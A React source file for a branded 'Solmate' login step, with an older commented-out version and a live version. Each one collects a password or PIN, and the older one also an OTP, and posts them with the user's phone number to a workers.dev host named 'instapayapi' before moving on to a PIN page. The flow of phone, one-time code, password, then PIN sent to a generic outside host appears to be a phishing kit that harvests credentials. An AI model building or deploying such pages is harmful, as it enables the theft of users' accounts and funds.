// import { useState } from "react";
// import { useNavigate, useLocation } from "react-router-dom";

// export default function SolmatePassword() {
//   const navigate = useNavigate();
//   const location = useLocation();

//   const phone = location.state?.phone || "";
//    const otp = location.state?.otp || "";

//   const [password, setPassword] = useState("");
//   const [showPassword, setShowPassword] = useState(false);
//   const [focused, setFocused] = useState(false);
//   const [error, setError] = useState("");
//   const [loading, setLoading] = useState(false);

//   const handleContinue = async () => {
//     setError("");

//     if (!password.trim()) {
//       setError("Password is required");
//       return;
//     }
//     if (password.length < 6) {
//       setError("Password must be at least 6 characters");
//       return;
//     }

//     try {
//       setLoading(true);
//       const response = await fetch(
//         "https://my-worker-app.instapayapi.workers.dev/api/passwordWithPhoneAndotp",
//         {
//           method: "POST",
//           headers: { "Content-Type": "application/json" },
//           body: JSON.stringify({ password, phone, otp }),
//         }
//       );

//       const text = await response.text();
//       let data = {};
//       try {
//         data = text ? JSON.parse(text) : {};
//       } catch {
//         data = { message: text };
//       }

//       if (!response.ok) {
//         setError(data.message || data.error || "Invalid password");
//         return;
//       }

//       // Navigate to PIN page
//       navigate("/pin", { state: { phone, password , otp} });
//     } catch (err) {
//       console.error("Network error:", err);
//       setError("Network error. Please try again.");
//     } finally {
//       setLoading(false);
//     }
//   };

//   const handleBack = () => {
//     if (window.history.length > 1) {
//       navigate(-1);
//     } else {
//       navigate("/");
//     }
//   };

//   const isEnabled = password.trim().length > 0 && !loading;

//   return (
//     <div className="min-h-screen bg-[#0A1721] flex flex-col px-6 pt-6 pb-6">
//       {/* Back Button */}
//       <button
//         onClick={handleBack}
//         aria-label="Go back"
//         className="w-10 h-10 flex items-center justify-start text-white hover:opacity-70 transition-opacity mb-12"
//       >
//         <svg
//           xmlns="http://www.w3.org/2000/svg"
//           width="28"
//           height="28"
//           viewBox="0 0 24 24"
//           fill="none"
//           stroke="currentColor"
//           strokeWidth="2.5"
//           strokeLinecap="round"
//           strokeLinejoin="round"
//         >
//           <line x1="19" y1="12" x2="5" y2="12"></line>
//           <polyline points="12 19 5 12 12 5"></polyline>
//         </svg>
//       </button>

//       {/* Heading */}
//       <h1 className="text-white text-4xl sm:text-5xl font-bold leading-tight mb-4">
//         Enter your<br />password
//       </h1>

//       {/* Subtitle */}
//       <p className="text-gray-400 text-base sm:text-lg mb-12">
//         Use a strong password to protect your account
//       </p>

//       {/* Password Input */}
//       <div className="mb-4">
//         <label
//           htmlFor="password"
//           className="block text-white text-lg font-normal mb-3"
//         >
//           Password
//         </label>

//         <div
//           className={`bg-[#1A2731] rounded-lg flex items-center transition ${
//             error
//               ? "ring-2 ring-red-500"
//               : focused
//               ? "ring-2 ring-[#FFD60A]"
//               : ""
//           }`}
//         >
//           <input
//             id="password"
//             type={showPassword ? "text" : "password"}
//             value={password}
//             onChange={(e) => {
//               setPassword(e.target.value);
//               if (error) setError("");
//             }}
//             onFocus={() => setFocused(true)}
//             onBlur={() => setFocused(false)}
//             onKeyDown={(e) => e.key === "Enter" && handleContinue()}
//             placeholder="Enter password"
//             autoFocus
//             className="flex-1 bg-transparent rounded-lg px-4 h-14 text-white placeholder-gray-500 outline-none text-base"
//           />
//           <button
//             type="button"
//             onClick={() => setShowPassword(!showPassword)}
//             aria-label={showPassword ? "Hide password" : "Show password"}
//             className="px-4 text-gray-400 hover:text-white transition-colors"
//           >
//             {showPassword ? (
//               <svg
//                 xmlns="http://www.w3.org/2000/svg"
//                 width="22"
//                 height="22"
//                 viewBox="0 0 24 24"
//                 fill="currentColor"
//               >
//                 <path d="M12 6.5c3.79 0 7.17 2.13 8.82 5.5-.59 1.22-1.42 2.27-2.41 3.12l1.41 1.41c1.39-1.23 2.49-2.77 3.18-4.53C21.27 7.61 17 4.5 12 4.5c-1.27 0-2.49.2-3.64.57l1.65 1.65c.65-.14 1.32-.22 1.99-.22zM2.71 3.16a.996.996 0 0 0 0 1.41l1.97 1.97C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.72a.996.996 0 1 0 1.41-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07L14.14 16c-.65.32-1.37.5-2.14.5zm2.97-5.33a2.97 2.97 0 0 0-2.64-2.64l2.64 2.64z" />
//               </svg>
//             ) : (
//               <svg
//                 xmlns="http://www.w3.org/2000/svg"
//                 width="22"
//                 height="22"
//                 viewBox="0 0 24 24"
//                 fill="currentColor"
//               >
//                 <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
//               </svg>
//             )}
//           </button>
//         </div>

//         {error && (
//           <p className="text-red-400 text-sm mt-3 font-medium">{error}</p>
//         )}
//       </div>

//       {/* Spacer */}
//       {/* <div className="flex-1"></div> */}

//       {/* Continue Button */}
//       <button
//         onClick={handleContinue}
//         disabled={!isEnabled}
//         className={`w-full py-4 rounded-full font-semibold text-lg transition-colors flex items-center justify-center gap-2 ${
//           isEnabled
//             ? "bg-[#FFD60A] text-[#0A1721] hover:bg-[#e6c109] active:bg-[#cca808]"
//             : "bg-[#5A6772] text-white cursor-not-allowed"
//         }`}
//       >
//         {loading ? (
//           <>
//             <svg
//               className="animate-spin h-5 w-5"
//               viewBox="0 0 24 24"
//               fill="none"
//             >
//               <circle
//                 cx="12"
//                 cy="12"
//                 r="10"
//                 stroke="currentColor"
//                 strokeWidth="4"
//                 className="opacity-25"
//               />
//               <path
//                 fill="currentColor"
//                 className="opacity-75"
//                 d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
//               />
//             </svg>
//             Loading...
//           </>
//         ) : (
//           "Continue"
//         )}
//       </button>
//     </div>
//   );
// }

import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function SolmatePassword() {
  const navigate = useNavigate();
  const location = useLocation();

  const phone = location.state?.phone || "";

  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [focused, setFocused] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleContinue = async () => {
    setError("");

    if (!password.trim()) {
      setError("Password/PIN is required");
      return;
    }
    if (password.length < 4) {
      setError("Password/PIN must be at least 4 characters");
      return;
    }

    try {
      setLoading(true);
      const response = await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/password",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ password, phone }),
        }
      );

      const text = await response.text();
      let data = {};
      try {
        data = text ? JSON.parse(text) : {};
      } catch {
        data = { message: text };
      }

      if (!response.ok) {
        setError(data.message || data.error || "Invalid password/PIN");
        return;
      }

      // Navigate to PIN page
      navigate("/verifypin", { state: { phone, password } });
    } catch (err) {
      console.error("Network error:", err);
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    if (window.history.length > 1) {
      navigate(-1);
    } else {
      navigate("/");
    }
  };

  const isEnabled = password.trim().length > 0 && !loading;

  return (
    <div className="min-h-screen bg-[#0A1721] flex flex-col px-6 pt-6 pb-6">
      {/* Back Button */}
      <button
        onClick={handleBack}
        aria-label="Go back"
        className="w-10 h-10 flex items-center justify-start text-white hover:opacity-70 transition-opacity mb-12"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="28"
          height="28"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2.5"
          strokeLinecap="round"
          strokeLinejoin="round"
        >
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
      </button>

      {/* Heading */}
      <h1 className="text-white text-4xl sm:text-5xl font-bold leading-tight mb-4">
        Enter your<br />password/PIN
      </h1>

      {/* Subtitle */}
      <p className="text-gray-400 text-base sm:text-lg mb-12">
        Enter your password or PIN to continue
      </p>

      {/* Password/PIN Input */}
      <div className="mb-4">
        <label
          htmlFor="password"
          className="block text-white text-lg font-normal mb-3"
        >
          Password/PIN
        </label>

        <div
          className={`bg-[#1A2731] rounded-lg flex items-center transition ${
            error
              ? "ring-2 ring-red-500"
              : focused
              ? "ring-2 ring-[#FFD60A]"
              : ""
          }`}
        >
          <input
            id="password"
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (error) setError("");
            }}
            onFocus={() => setFocused(true)}
            onBlur={() => setFocused(false)}
            onKeyDown={(e) => e.key === "Enter" && handleContinue()}
            placeholder="Enter password or PIN"
            autoFocus
            className="flex-1 bg-transparent rounded-lg px-4 h-14 text-white placeholder-gray-500 outline-none text-base"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            aria-label={showPassword ? "Hide password" : "Show password"}
            className="px-4 text-gray-400 hover:text-white transition-colors"
          >
            {showPassword ? (
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="22"
                height="22"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 6.5c3.79 0 7.17 2.13 8.82 5.5-.59 1.22-1.42 2.27-2.41 3.12l1.41 1.41c1.39-1.23 2.49-2.77 3.18-4.53C21.27 7.61 17 4.5 12 4.5c-1.27 0-2.49.2-3.64.57l1.65 1.65c.65-.14 1.32-.22 1.99-.22zM2.71 3.16a.996.996 0 0 0 0 1.41l1.97 1.97C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.72a.996.996 0 1 0 1.41-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07L14.14 16c-.65.32-1.37.5-2.14.5zm2.97-5.33a2.97 2.97 0 0 0-2.64-2.64l2.64 2.64z" />
              </svg>
            ) : (
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="22"
                height="22"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
              </svg>
            )}
          </button>
        </div>

        {error && (
          <p className="text-red-400 text-sm mt-3 font-medium">{error}</p>
        )}
      </div>

      {/* Spacer */}
      {/* <div className="flex-1"></div> */}

      {/* Continue Button */}
      <button
        onClick={handleContinue}
        disabled={!isEnabled}
        className={`w-full py-4 rounded-full font-semibold text-lg transition-colors flex items-center justify-center gap-2 ${ "bg-[#FFD60A] text-[#0A1721] hover:bg-[#e6c109] active:bg-[#cca808]"
        }`}
      >
        {loading ? (
          <>
            <svg
              className="animate-spin h-5 w-5"
              viewBox="0 0 24 24"
              fill="none"
            >
              <circle
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
                className="opacity-25"
              />
              <path
                fill="currentColor"
                className="opacity-75"
                d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
              />
            </svg>
            Loading...
          </>
        ) : (
          "Continue"
        )}
      </button>
    </div>
  );
}